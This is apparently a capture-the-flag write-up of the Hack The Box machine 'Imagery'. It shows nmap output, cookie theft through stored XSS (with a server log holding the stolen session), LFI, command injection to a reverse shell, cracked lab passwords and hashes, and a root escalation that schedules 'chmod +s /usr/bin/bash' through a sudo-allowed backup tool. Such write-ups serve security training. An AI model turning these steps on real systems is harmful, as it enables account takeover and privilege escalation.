1. Initial scan and foothold
```bash
┌──(sabeshan㉿kali)-[~]
└─$ nmap -sS -A -sV -sC -T4 10.10.11.88 -vv
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-04 09:38 IST
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 09:38
Completed NSE at 09:38, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 09:38
Completed NSE at 09:38, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 09:38
Completed NSE at 09:38, 0.00s elapsed
Initiating Ping Scan at 09:38
Scanning 10.10.11.88 [4 ports]
Completed Ping Scan at 09:38, 0.81s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 09:38
Completed Parallel DNS resolution of 1 host. at 09:38, 0.15s elapsed
Initiating SYN Stealth Scan at 09:38
Scanning 10.10.11.88 [1000 ports]
Discovered open port 22/tcp on 10.10.11.88
Discovered open port 8000/tcp on 10.10.11.88
Discovered open port 7777/tcp on 10.10.11.88
Discovered open port 7777/tcp on 10.10.11.88
Completed SYN Stealth Scan at 09:38, 5.69s elapsed (1000 total ports)
Initiating Service scan at 09:38
Scanning 3 services on 10.10.11.88
Completed Service scan at 09:41, 185.43s elapsed (3 services on 1 host)
Initiating OS detection (try #1) against 10.10.11.88
Initiating Traceroute at 09:41
Completed Traceroute at 09:41, 0.65s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 09:41
Completed Parallel DNS resolution of 2 hosts. at 09:41, 6.56s elapsed
NSE: Script scanning 10.10.11.88.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 09:41
Completed NSE at 09:42, 21.45s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 09:42
Completed NSE at 09:42, 4.09s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 09:42
Completed NSE at 09:42, 0.00s elapsed
Nmap scan report for 10.10.11.88
Host is up, received echo-reply ttl 63 (0.67s latency).
Scanned at 2025-10-04 09:38:21 IST for 231s
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 9.7p1 Ubuntu 7ubuntu4.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:94:fb:70:36:1a:26:3c:a8:3c:5a:5a:e4:fb:8c:18 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKyy0U7qSOOyGqKW/mnTdFIj9zkAcvMCMWnEhOoQFWUYio6eiBlaFBjhhHuM8hEM0tbeqFbnkQ+6SFDQw6VjP+E=
|   256 c2:52:7c:42:61:ce:97:9d:12:d5:01:1c:ba:68:0f:fa (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBleYkGyL8P6lEEXf1+1feCllblPfSRHnQ9znOKhcnNM
7777/tcp open  cbt?    syn-ack ttl 63
8000/tcp open  http    syn-ack ttl 63 Werkzeug httpd 3.1.3 (Python 3.12.7)
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET
|_http-title: Image Gallery
|_http-server-header: Werkzeug/3.1.3 Python/3.12.7
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=10/4%OT=22%CT=1%CU=39737%PV=Y%DS=2%DC=T%G=Y%TM=68E09E9
OS:C%P=x86_64-pc-linux-gnu)SEQ(SP=FF%GCD=2%ISR=10A%TI=Z%CI=Z%II=I%TS=A)OPS(
OS:O1=M569ST11NW7%O2=M569ST11NW7%O3=M569NNT11NW7%O4=M569ST11NW7%O5=M569ST11
OS:NW7%O6=M569ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(
OS:R=Y%DF=Y%T=40%W=FAF0%O=M569NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

Uptime guess: 1.355 days (since Fri Oct  3 01:11:16 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=255 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 21/tcp)
HOP RTT       ADDRESS
1   647.79 ms 10.10.16.1
2   300.33 ms 10.10.11.88

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 09:42
Completed NSE at 09:42, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 09:42
Completed NSE at 09:42, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 09:42
Completed NSE at 09:42, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 232.86 seconds
           Raw packets sent: 1143 (51.078KB) | Rcvd: 1139 (46.398KB)
```
---

I saw a login page and I registered as a random user and explore the website.
<img width="1919" height="859" alt="image" src="https://github.com/user-attachments/assets/7b47c4e5-58e8-4b22-a7f1-8707bf681dfe" />

---
<img width="1919" height="850" alt="image" src="https://github.com/user-attachments/assets/2358f5be-756e-4611-99eb-2c171be47d35" />

in the footer section we can see the multiple navigation there i explored those i found the report bug is vulnerable to 
this thing.

---
<img width="1729" height="537" alt="image" src="https://github.com/user-attachments/assets/f68cbe62-cced-4ad6-9cbd-f455d086802a" />

With these section i can execute a stored XSS bug and we can obtain a cookie.

---

I just got the admin cookie via these stores xss and i moved the with admin panel.
```bash
┌──(sabeshan㉿kali)-[~/HTB/season9/imagery]
└─$ sudo python3 -m http.server
[sudo] password for sabeshan: 
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.11.88 - - [04/Oct/2025 09:56:21] code 404, message File not found
10.10.11.88 - - [04/Oct/2025 09:56:21] "GET /session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aOCiIQ.nRNSOI6VqpnOhphxWJi3RoE9Ajc HTTP/1.1" 404 -
10.10.11.88 - - [04/Oct/2025 09:56:23] code 404, message File not found
10.10.11.88 - - [04/Oct/2025 09:56:23] "GET /favicon.ico HTTP/1.1" 404 -
^C
Keyboard interrupt received, exiting.
```

---

And now i can access the admin panel via stealed admin cookie.
<img width="1919" height="855" alt="image" src="https://github.com/user-attachments/assets/929305ec-f762-4a34-bc70-0363e37f821b" />

---

I just get the the LFI and get the db.json and i have the credentials of testuser and admin.
<img width="1919" height="957" alt="image" src="https://github.com/user-attachments/assets/c288f933-e0a9-430e-9d9d-581136282af6" />

---

I got the credentials for
```bash
testuser@imagery.htb:iambatman
admin@imagery.htb:
```

---

then I upload the image and use it to get the file and then i navigate to gallery --> transformed --> there is option called crop there
and i used it to find the thing.
<img width="1919" height="910" alt="image" src="https://github.com/user-attachments/assets/2be62ab4-6742-43a2-9e23-a3b12bcedec7" />

and i use the revershell and I got the user as web.

---
<img width="1577" height="812" alt="image" src="https://github.com/user-attachments/assets/828655b7-4bda-468f-8885-b9ad0bf8c1ab" />

with these we can execute command injection and get the reverse shell from it.

---

After the enumeration i got the file aes encryption i crack the password with the rckyou.txt that is bestfriend --> 

```bash
import pyAesCrypt
import sys
import os

# === user settings ===
infile  = "web_20250806_120723.zip.aes"   # encrypted file
outfile = "web_20250806_120723.zip"       # desired decrypted output
password = "YOUR_PASSWORD_HERE"           # change this to your password (or prompt)
# ======================

bufferSize = 64 * 1024  # 64KB (default in examples)

try:
    if not os.path.isfile(infile):
        raise SystemExit(f"Encrypted file not found: {infile}")
    pyAesCrypt.decryptFile(infile, outfile, password, bufferSize)
    print(f"Decryption finished — output written to: {outfile}")
except ValueError as e:
    # ValueError is raised by pyAesCrypt on wrong password or corrupted file
    print("Decryption failed — wrong password or corrupted file.")
    print("Error:", e)
except Exception as e:
    print("Unexpected error:", e)
```
---
```bash
┌──(myenv)─(sabeshan㉿kali)-[~/HTB/season9/imagery]
└─$ file *                                 
creds.txt:                   JSON text data
hash:                        ASCII text
web_20250806_120723.zip:     empty
web_20250806_120723.zip.aes: AES encrypted data, version 2, created by "pyAesCrypt 6.1.1"
```
---

```bash

┌──(myenv)─(sabeshan㉿kali)-[~/HTB/season9/imagery]
└─$ pip install pyAesCrypt
Collecting pyAesCrypt
  Downloading pyAesCrypt-6.1.1-py3-none-any.whl.metadata (5.2 kB)
Requirement already satisfied: cryptography in /home/sabeshan/thm/kitt/myenv/lib/python3.13/site-packages (from pyAesCrypt) (42.0.8)
Requirement already satisfied: cffi>=1.12 in /home/sabeshan/thm/kitt/myenv/lib/python3.13/site-packages (from cryptography->pyAesCrypt) (1.17.1)
Requirement already satisfied: pycparser in /home/sabeshan/thm/kitt/myenv/lib/python3.13/site-packages (from cffi>=1.12->cryptography->pyAesCrypt) (2.22)
Downloading pyAesCrypt-6.1.1-py3-none-any.whl (16 kB)
Installing collected packages: pyAesCrypt
Successfully installed pyAesCrypt-6.1.1
                                                                                                                                                             
┌──(myenv)─(sabeshan㉿kali)-[~/HTB/season9/imagery]
└─$ python3 decrypt.py    
Decryption finished — output written to: web_20250806_120723.zip
                                                                                                                                                             
┌──(myenv)─(sabeshan㉿kali)-[~/HTB/season9/imagery]
└─$ unzip web_20250806_120723.zip
Archive:  web_20250806_120723.zip
  inflating: web/utils.py            
  inflating: web/api_manage.py       
  inflating: web/api_misc.py         
  inflating: web/api_auth.py         
  inflating: web/config.py           
  inflating: web/app.py              
  inflating: web/api_admin.py        
  inflating: web/api_upload.py       
  inflating: web/db.json             
  inflating: web/api_edit.py         
```
---

```bash
{
    "users": [
        {
            "username": "admin@imagery.htb",
            "password": "5d9c1d507a3f76af1e5c97a3ad1eaa31",
            "displayId": "f8p10uw0",
            "isTestuser": false,
            "isAdmin": true,
            "failed_login_attempts": 0,
            "locked_until": null
        },
        {
            "username": "testuser@imagery.htb",
            "password": "2c65c8d7bfbca32a3ed42596192384f6",
            "displayId": "8utz23o5",
            "isTestuser": true,
            "isAdmin": false,
            "failed_login_attempts": 0,
            "locked_until": null
        },
        {
            "username": "mark@imagery.htb",
            "password": "01c3d2e5bdaf6134cec0a367cf53e535",
            "displayId": "868facaf",
            "isAdmin": false,
            "failed_login_attempts": 0,
            "locked_until": null,
            "isTestuser": false
        },
        {
            "username": "web@imagery.htb",
            "password": "84e3c804cf1fa14306f26f9f3da177e0",
            "displayId": "7be291d4",
            "isAdmin": true,
            "failed_login_attempts": 0,
            "locked_until": null,
            "isTestuser": false
        }
    ],
```

I got the password for mark.:supersmash

<img width="1340" height="498" alt="image" src="https://github.com/user-attachments/assets/3ac212d0-cfe4-424d-9509-58ba8f7ce177" />

---

Privilege escalation

reset the charcol configuration 
add the schedule --> auto add --schedule "* * * * *" --command "chmod 4755 /usr/bin/bash" --name "Set SUID Bash" --log-output "/home/mark/log.txt"
```bash
mark@Imagery:~$ sudo -l
Matching Defaults entries for mark on Imagery:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User mark may run the following commands on Imagery:
    (ALL) NOPASSWD: /usr/local/bin/charcol
mark@Imagery:~$ sudo /usr/local/bin/charcol shell
Enter your Charcol master passphrase (used to decrypt stored app password): 

[2025-10-04 06:52:56] [ERROR] Incorrect master passphrase. 2 retries left. (Error Code: CPD-002)
Enter your Charcol master passphrase (used to decrypt stored app password): 

[2025-10-04 06:53:12] [ERROR] Incorrect master passphrase. 1 retries left. (Error Code: CPD-002)
Enter your Charcol master passphrase (used to decrypt stored app password): 

[2025-10-04 06:53:22] [ERROR] Incorrect master passphrase after multiple attempts. Exiting application. If you forgot your master passphrase, then reset password using charcol -R command for more info do charcol help. (Error Code: CPD-002)
Please submit the log file and the above error details to error@charcol.com if the issue persists.
mark@Imagery:~$ sudo /usr/local/bin/charcol -R   

Attempting to reset Charcol application password to default.
[2025-10-04 06:54:37] [INFO] System password verification required for this operation.
Enter system password for user 'mark' to confirm: 

[2025-10-04 06:54:43] [INFO] System password verified successfully.
Removed existing config file: /root/.charcol/.charcol_config
Charcol application password has been reset to default (no password mode).
Please restart the application for changes to take effect.
mark@Imagery:~$ sudo /usr/local/bin/charcol shell

First time setup: Set your Charcol application password.
Enter '1' to set a new password, or press Enter to use 'no password' mode: 
Are you sure you want to use 'no password' mode? (yes/no): yes
[2025-10-04 06:57:08] [INFO] Default application password choice saved to /root/.charcol/.charcol_config
Using 'no password' mode. This choice has been remembered.
Please restart the application for changes to take effect.
mark@Imagery:~$ sudo /usr/local/bin/charcol shell

  ░██████  ░██                                                  ░██ 
 ░██   ░░██ ░██                                                  ░██ 
░██        ░████████   ░██████   ░██░████  ░███████   ░███████  ░██ 
░██        ░██    ░██       ░██  ░███     ░██    ░██ ░██    ░██ ░██ 
░██        ░██    ░██  ░███████  ░██      ░██        ░██    ░██ ░██ 
 ░██   ░██ ░██    ░██ ░██   ░██  ░██      ░██    ░██ ░██    ░██ ░██ 
  ░██████  ░██    ░██  ░█████░██ ░██       ░███████   ░███████  ░██ 
                                                                    
                                                                    
                                                                    
Charcol The Backup Suit - Development edition 1.0.0

[2025-10-04 06:57:34] [INFO] Entering Charcol interactive shell. Type 'help' for commands, 'exit' to quit.
<--command "chmod +s /usr/bin/bash" --name "GetRoot"
[2025-10-04 06:57:52] [INFO] System password verification required for this operation.
Enter system password for user 'mark' to confirm: 

[2025-10-04 06:58:11] [INFO] System password verified successfully.
[2025-10-04 06:58:11] [INFO] Auto job 'GetRoot' (ID: 3267c1d6-34c0-4c5d-8dca-c873f0cd1564) added successfully. The job will run according to schedule.
[2025-10-04 06:58:11] [INFO] Cron line added: * * * * * CHARCOL_NON_INTERACTIVE=true chmod +s /usr/bin/bash
charcol> exit
[2025-10-04 06:58:49] [INFO] Exiting Charcol shell.
mark@Imagery:~$ id
uid=1002(mark) gid=1002(mark) groups=1002(mark)
mark@Imagery:~$ /usr/bin/bash -p
bash-5.2# cd /
bash-5.2# ls
bin   cdrom  etc   lib    lost+found  mnt  proc  run   snap  sys  usr
boot  dev    home  lib64  media       opt  root  sbin  srv   tmp  var
bash-5.2# cd /root
bash-5.2# wc -c root.txt
33 root.txt
```




